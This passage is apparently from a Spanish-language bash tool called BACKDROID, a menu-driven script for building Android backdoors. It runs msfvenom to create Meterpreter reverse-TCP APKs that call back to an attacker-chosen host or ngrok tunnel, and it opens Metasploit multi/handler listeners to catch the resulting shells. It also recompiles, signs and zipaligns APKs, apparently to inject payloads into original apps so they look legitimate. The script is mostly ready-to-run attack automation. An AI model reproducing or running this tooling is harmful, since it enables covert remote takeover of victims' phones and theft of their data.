echo -e "${NARANJA}[✔]PAYLOAD INYECTADO"
echo
menu3
read enterkey
;;
3)
spiner
clear
echo -e "${GREEN}  

       ▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄  ▄▄▄        ▪  ·▄▄▄▄  
       ▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▀▄ █·▪     ██ ██▪ ██ 
       ▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▐█·▐█· ▐█▌
       ██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█•█▌▐█▌.▐▌▐█▌██. ██ 
       ·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀• .▀  ▀ ▀█▄▀▪▀▀▀▀▀▀▀▀•  "
echo -e "                                               ${MORADO}by: Yaxter${WHITE}"
echo   
apktool empty-framework-dir --force > /dev/null 2>&1
echo -e "${NARANJA}SELECCIONE LA RUTA Y EL NOMBRE DEL ARCHIVO A COMPILAR"
echo
echo -e "${WHITE}"
echo
pwd
echo
ls -x
echo
read -p "RUTA (ejp:file/file/appname) >> " rut
echo
read -p "NOMBRE DEL ARCHIVO A COMPILAR: " roc
echo
read -p "NOMBRE QUE TENDRA LA APP: " rat
echo
echo -e "${GREEN}"
echo -e "COMPILANDO..."
java -jar $rut/apktool.jar b $roc -o $rat.apk

echo -e "${WHITE}LISTO"
menu3
;;
4)
spiner
clear
echo -e "${GREEN}  

       ▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄  ▄▄▄        ▪  ·▄▄▄▄  
       ▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▀▄ █·▪     ██ ██▪ ██ 
       ▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▐█·▐█· ▐█▌
       ██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█•█▌▐█▌.▐▌▐█▌██. ██ 
       ·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀• .▀  ▀ ▀█▄▀▪▀▀▀▀▀▀▀▀•  "
echo -e "                                               ${MORADO}by: Yaxter${WHITE}"
echo  
echo -e "${BLUE}FIRMAR APK"
echo
echo -e "${WHITE}RUTA ACTUAL"
echo
pwd
echo
ls -x
echo
read -p "RUTA DE SU KEYSTORE >> " hjf

echo
read -p "NOMBRE DEL KEYSTORE: " ki
echo
read -p "ALIAS: " all
echo
read -p "NOMBRE DEL APK: " aplication
echo 
echo
tput civis
cd $hjf
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $ki $aplication.apk $all
echo
echo -e "${GREEN}SU APP HA SIDO FIRMADA ✔"
menu3
tput cnorm;
;;
5)
spiner
clear
echo -e "${GREEN}  

       ▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄  ▄▄▄        ▪  ·▄▄▄▄  
       ▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▀▄ █·▪     ██ ██▪ ██ 
       ▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▐█·▐█· ▐█▌
       ██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█•█▌▐█▌.▐▌▐█▌██. ██ 
       ·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀• .▀  ▀ ▀█▄▀▪▀▀▀▀▀▀▀▀•  "
echo -e "                                               ${MORADO}by: Yaxter${WHITE}"
echo    
echo -e "${NARANJA}COMPRIMIR APP"
echo
echo -e "${WHITE}"
echo "RUTA ACTUAL"
echo
pwd
echo
ls -x
echo
read -p "GUARDAR EN >>" tm
cd $tm 
echo
read -p "NOMBRE DEL APK QUE DESEA COMPRIMIR: " nombr3
echo
read -p "NOMBRE FINAL PARA EL APK " nombre4
echo 
cd $tm
zipalign -v 4 $nombr3.apk $nombre4.apk
echo -e "${GREEN}"
echo -e "APP COMPRIMIDA CON EXITO ✔"
menu3
;;
6)
spiner
clear
echo -e "${GREEN}  

       ▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄  ▄▄▄        ▪  ·▄▄▄▄  
       ▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▀▄ █·▪     ██ ██▪ ██ 
       ▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▐█·▐█· ▐█▌
       ██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█•█▌▐█▌.▐▌▐█▌██. ██ 
       ·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀• .▀  ▀ ▀█▄▀▪▀▀▀▀▀▀▀▀•  "
echo -e "                                               ${MORADO}by: Yaxter${WHITE}"
echo   
echo -e "${BLUE}[*] EL KEYSTORE SIRVE PARA FIRMAR LA APP, UNA VEZ CREADO LO 
                PUEDE VOLVER A UTILIZAR"
echo
echo
read -p "NOMBRE: " nm
echo
read -p "ALIAS: " mj
echo
echo -e "${WHITE}RUTA ACTUAL"
echo
pwd
echo
ls -x
echo
read -p "GUARDAR EN: " gg
echo 
echo -e "${NARANJA}ES IMPORTANTE QUE RECUERDE LOS DATOS QUE INGRESARA"
echo 
echo
cd $gg 
keytool -genkey -v -keystore $nm.keystore -alias $mj -keyalg RSA -keysize 2048 -validity 10000
echo -e "${GREEN}KEYSTORE CREADO CON EXITO ✔"
menu3
;;
1)
spiner
echo -e $Reset""
postgresql_start
clear
INYECCION!2
menu3
;;
7)
bash BACKDROID 
;;
*)
echo "OPCION [$option] NO ENCONTRADA"            
esac
done
}
apkmsf() {
echo -e "${GREEN}  

       ▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄  ▄▄▄        ▪  ·▄▄▄▄  
       ▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▀▄ █·▪     ██ ██▪ ██ 
       ▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▐█·▐█· ▐█▌
       ██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█•█▌▐█▌.▐▌▐█▌██. ██ 
       ·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀• .▀  ▀ ▀█▄▀▪▀▀▀▀▀▀▀▀•  "
echo -e "                                               ${MORADO}by: Yaxter${WHITE}"
echo   
read -p "PUERTO: " o
echo
read -p "IP o HOST: " HOST
echo
read -p "Nombre del Backdoor: " q
echo
echo -e "RUTA ACTUAL: "
pwd
echo
ls -x
echo
read -p "RUTA DESTINO: " u
echo
echo -e "${NARANJA}CREANDO BACKDOOR"
msfvenom -p android/meterpreter/reverse_tcp LHOST=$HOST LPORT=$o -o $u/$q.apk
echo -e "CREADO CON ${GREEN}EXITO${NARANJA}"
echo
echo -e "ACTIVANDO POSTGRESQL"
sudo service postgresql start 
echo -e "ACTIVADO CON ${GREEN}EXITO ✔" 
echo
}

android() {
clear
echo -e "${GREEN}  

       ▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄  ▄▄▄        ▪  ·▄▄▄▄  
       ▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▀▄ █·▪     ██ ██▪ ██ 
       ▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▐█·▐█· ▐█▌
       ██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█•█▌▐█▌.▐▌▐█▌██. ██ 
       ·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀• .▀  ▀ ▀█▄▀▪▀▀▀▀▀▀▀▀•  "
echo -e "                                               ${MORADO}by: Yaxter${WHITE}"
echo   
echo -e ${NARANJA}"INGRESE LOS SIGUIENTES DATOS"
echo
echo -e ${WHITE}
read -p "PUERTO: " port
echo 
read -p "IP O HOST: " host
echo
read -p "NOMBRE: " name
echo -e "${GREEN}PREPARANDO APK"
tput civis	
msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o /sdcard/$name.apk
echo 
echo -e "LISTO"
echo -e "${BLUE}ACTIVANDO POSTGRESQL"
sudo service postgresql start 
echo -e "ACTIVADO CON ${GREEN}EXITO" 
echo
clear
tput cnorm;
echo -e "${BLUE}INGRESE LOS SIGUIENTES DATOS PARA ${GREEN}ACTIVAR EL BACKDOOR CREADO"
echo
echo
echo -e "${WHITE}"
read -p "HOST: " ho
echo
read -p "PUERTO: " po
echo -e "${GREEN}LISTO ✔"
clear
echo -e "ABRIENDO ${BLUE}METASPLOIT"
msfconsole -x "use multi/handler;\
set PAYLOAD android/meterpreter/reverse_tcp;\
set lport $po;\
set lhost $ho;\
exploit"
echo -e "${RED}SALIENDO..."
exit

}


consola() {
clear
echo -e "${GREEN}  

       ▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄  ▄▄▄        ▪  ·▄▄▄▄  
       ▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▀▄ █·▪     ██ ██▪ ██ 
       ▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▐█·▐█· ▐█▌
       ██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█•█▌▐█▌.▐▌▐█▌██. ██ 
       ·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀• .▀  ▀ ▀█▄▀▪▀▀▀▀▀▀▀▀•  "
echo -e "                                               ${MORADO}by: Yaxter${WHITE}"
echo   
echo -e ${WHITE}
read -p "PUERTO: " port4
echo 
read -p "IP O HOST: " host6
echo -e "${BLUE}ABRIENDO ${BLUE}METASPLOIT"
tput civis
msfconsole -x "use multi/handler;\
set PAYLOAD android/meterpreter/reverse_tcp;\
set lport $port4;\
set lhost $host6;\
exploit"
tput cnorm;
echo -e "${RED}SALIENDO..."
exit
}

ngrok1(){
echo -e "${GREEN}  

       ▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄  ▄▄▄        ▪  ·▄▄▄▄  
       ▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▀▄ █·▪     ██ ██▪ ██ 
       ▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▐█·▐█· ▐█▌
       ██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█•█▌▐█▌.▐▌▐█▌██. ██ 
       ·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀• .▀  ▀ ▀█▄▀▪▀▀▀▀▀▀▀▀•  "
echo -e "                                               ${MORADO}by: Yaxter${WHITE}"
echo  
	while :
	do
		option2=0
		echo 
		echo -e "${GREEN}NGROK"
		echo
		read -p "PUERTO: " pp
		echo
	xterm -hold -e ./ngrok tcp $pp
	exit
done
}
spiner() {
  spin=(Cargando cArgando caRgando carGando cargAndo cargaNdo carganDo cargandO)
	for i in "${spin[@]}"
	do
		echo -ne "\r$i"
		sleep 0.1s
	done
	}
submenu1() {
echo -e "${GREEN}  

       ▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄  ▄▄▄        ▪  ·▄▄▄▄  
       ▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▀▄ █·▪     ██ ██▪ ██ 
       ▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▐█·▐█· ▐█▌
       ██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█•█▌▐█▌.▐▌▐█▌██. ██ 
       ·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀• .▀  ▀ ▀█▄▀▪▀▀▀▀▀▀▀▀•  "
echo -e "                                               ${MORADO}by: Yaxter${WHITE}"
echo
 	while :
 	do
 	option1=0
 	echo
 	echo -e "QUE SERVICIO DESEA USAR"
 	echo
 	echo -e "${NARANJA}[1] ${GREEN}IP LOCAL"
 	echo
 	echo -e "${NARANJA}[2] ${GREEN}NGROK"
 	echo
 	echo -e "${NARANJA}[3] VOLVER"
 	echo
 	echo
 	echo -n -e "${BLUE}>>> "
 	read option1
 	case $option1 in 2)	
	clear
	echo -e "${GREEN}NGROK"
	echo
	read -p "PUERTO: " pp
	echo
	xterm -hold -e "./ngrok tcp $pp" &
	clear
	echo -e "${NARANJA}PARA CREAR EL BACKDOOR NECESITO LO SIGUIENTE${WHITE}"
	echo
	echo
read -p "PUERTO :" o
echo
read -p "IP o HOST:" a
echo
read -p "Nombre del Backdoor:" q
echo
tput civis
echo -e "${NARANJA}CREANDO ${BLUE}BACKDOOR"
msfvenom -p android/meterpreter/reverse_tcp LHOST=$a LPORT=$o -o /home/$q.apk
echo -e "CREADO CON ${GREEN}EXITO${NARANJA}"
echo
echo -e "ACTIVANDO POSTGRESQL"
sudo service postgresql start 
echo -e "ACTIVADO CON ${GREEN}EXITO" 
echo
clear
echo -e "INGRESE LOS SIGUIENTES DATOS PARA ACTIVAR EL BACKDOOR CREADO"
echo
tput cnorm;
echo
read -p "HOST: " h
echo
read -p "PUERTO: " p
echo -e "${GREEN}LISTO ✔"
clear
tput civis
echo -e "ABRIENDO ${BLUE}METASPLOIT"
msfconsole -x "use multi/handler;\
set PAYLOAD android/meterpreter/reverse_tcp;\
set lport $p;\
set lhost $h;\
exploit"
tput cnorm;
echo -e "${RED}SALIENDO..."
exit
read enterkey
;;
1)
clear
echo -e "${GREEN}  

       ▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄  ▄▄▄        ▪  ·▄▄▄▄  
       ▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▀▄ █·▪     ██ ██▪ ██ 
       ▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▐█·▐█· ▐█▌
       ██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█•█▌▐█▌.▐▌▐█▌██. ██ 
       ·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀• .▀  ▀ ▀█▄▀▪▀▀▀▀▀▀▀▀•  "
echo -e "                                               ${MORADO}by: Yaxter${WHITE}"
  echo
	echo -e "${NARANJA}PARA CREAR EL BACKDOOR NECESITO LO SIGUIENTE${WHITE}"
	echo
	echo

                read -p "PUERTO: " o
                echo
                read -p "IP o HOST: " a
                echo
                read -p "NOMBRE DEL BACKDOOR " q
                echo
                tput civis
                echo -e "${NARANJA}CREANDO ${BLUE}BACKDOOR"
                msfvenom -p android/meterpreter/reverse_tcp LHOST=$a LPORT=$o R > /sdcard/$q.apk
                echo -e "CREADO CON ${GREEN}EXITO"
                echo
                echo -e "${NARANJA}ACTIVANDO POSTGRESQL"
                sudo service postgresql start 
                echo -e "ACTIVADO CON ${GREEN}EXITO ✔" 
                echo
                echo -e "ABRIENDO ${BLUE}METASPLOIT"
                msfconsole -x "use multi/handler;\
                set PAYLOAD android/meterpreter/reverse_tcp;\
                set lport $o;\
                set lhost $a;\
                exploit"
                tput cnorm
                echo -e "${RED}SALIENDO..."
                exit
                read enterkey
                ;;
                3)
sudo bash BACKDROID
            esac
        done
      }       

submenu() {
echo -e "${GREEN}  

       ▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄  ▄▄▄        ▪  ·▄▄▄▄  
       ▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▀▄ █·▪     ██ ██▪ ██ 
       ▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▐█·▐█· ▐█▌
       ██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█•█▌▐█▌.▐▌▐█▌██. ██ 
       ·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀• .▀  ▀ ▀█▄▀▪▀▀▀▀▀▀▀▀•  "
echo -e "                                               ${MORADO}by: Yaxter${WHITE}"
echo   
while :
do
option=0
echo
sleep "0.5"
echo -e "SELECCIONE UNA OPCION"
echo
echo -e "${NARANJA}[1] ${GREEN}BACKDOOR ANDROID TCP (SDCARD)"
echo -e "${NARANJA}[2] ${GREEN}BACKDOOR ANDROID TCP (PC)"
echo -e "${NARANJA}[3] ${GREEN}VOLVER"
echo
echo
echo -n -e "${BLUE}>>> "
read option
case $option in
1)
echo
sleep "0.4" 
clear               
submenu1
echo
echo

               
read enterkey
;;
2)

sleep "0.4"
clear
 submenu1
 echo
 echo
 read enterkey
;;
3)

sudo bash BACKDROID
read enterkey
;;
*)
echo -e "OPCION $option NO ENCONTRADA"
esac
done  
}
clear
echo -e "${BLUE2}"
checkinternet
tput civis
echo -e "${BLUE}® VERIFICANDO DEPENDENCIAS ®"
echo
sleep 1
# check if metasploit-framework is installed
which msfconsole > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Metasploit-Framework..............${LighGreenF}[ YES ]"
which msfconsole > /dev/null 2>&1
else
echo -e $red "[ X ] Metasploit-Framework  -> ${RedF}NO "
echo -e $yellow "[ ! ] Instalando Metasploit-Framework "
sudo apt-get install metasploit-framework -y
echo -e $blue "[ ✔ ] Terminando instalacion ...."
which msfconsole > /dev/null 2>&1
fi
#Check for Android Asset Packaging Tool
which aapt > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Aapt..............................${LighGreenF}[ YES ]"
which aapt > /dev/null 2>&1
else
echo ""
echo -e $red "[ X ] Aapt -> ${RedF}NO! "
echo -e $yellow "[ ! ] Instalando Aapt "
echo -e $green ""
sudo apt-get install aapt -y
sudo apt-get install android-framework-res -y
clear
echo -e $blue "[ ✔ ] Terminando instalacion .... "
which aapt > /dev/null 2>&1
fi
#Check for Apktool Reverse Engineering
which apktool > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Apktool...........................${LighGreenF}[ YES ]"
which aapt > /dev/null 2>&1
else
echo ""
echo -e $red "[ X ] Apktool -> ${RedF}NO! "
echo -e $yellow "[ ! ] Instalando Apktool "
echo -e $green ""
sudo apt-get install apktool -y
clear
echo -e $blue "[ ✔ ] Terminando instalacion .... "
which apktool > /dev/null 2>&1
fi
#check for zipalign
which zipalign > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Zipalign..........................${LighGreenF}[ YES ]"
which aapt > /dev/null 2>&1
else
echo ""
echo -e $red "[ X ] Zipalign -> ${RedF}NO! "
echo -e $yellow "[ ! ] Instalando Zipalign "
echo -e $green ""
sudo apt-get install zipalign -y
clear
echo -e $blue "[ ✔ ] Terminando instalacion .... "
which zipalign > /dev/null 2>&1
fi
sleep 1
clear
tput cnorm;
echo -e "${GREEN}  

       ▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄  ▄▄▄        ▪  ·▄▄▄▄  
       ▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▀▄ █·▪     ██ ██▪ ██ 
       ▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▐█·▐█· ▐█▌
       ██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█•█▌▐█▌.▐▌▐█▌██. ██ 
       ·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀• .▀  ▀ ▀█▄▀▪▀▀▀▀▀▀▀▀• 
                                                    V1.0"


echo -e "                         ${MORADO}by: yaxter"
echo
echo -e "----------------------------------------------------------------"
echo -e "-------------------------|   ${NARANJA}MENU${MORADO}   |---------------------------"
echo -e "----------------------------------------------------------------"                                                                                                                                                                                                                                                                                                                                                                                        
echo -e "${BLUE}"
echo -e "${BLUE}SELECCIONE UNA OPCION"
echo
while :
do
option=0
echo -e "${NARANJA}[✔] SOLO PARA MOVIL"
echo
echo -e "${NARANJA}[1] ${GREEN}BACKDOOR ANDROID MSF"
echo -e "${NARANJA}[2] ${GREEN}MSFCONSOLE"

echo
echo -e "${NARANJA}[✔] SOLO PARA PC"
echo
echo -e "${NARANJA}[3] ${GREEN}BACKDOOR ANDROID MSF"
echo -e "${NARANJA}[4] ${GREEN}APK ORIGINAL"
echo
echo -n -e "${BLUE}>>> "
read option
case $option in 
2)
spiner
clear
consola
read enterkey
;;
3)
spiner
clear
echo -e "${NARANJA}"
submenu
read enterkey
;;
4)
spiner
clear
menu3

read enterkey

;;
1)
spiner
clear
android
read enterkey
;;
*)
echo "OPCION [$option] NO ENCONTRADA"            
esac
done

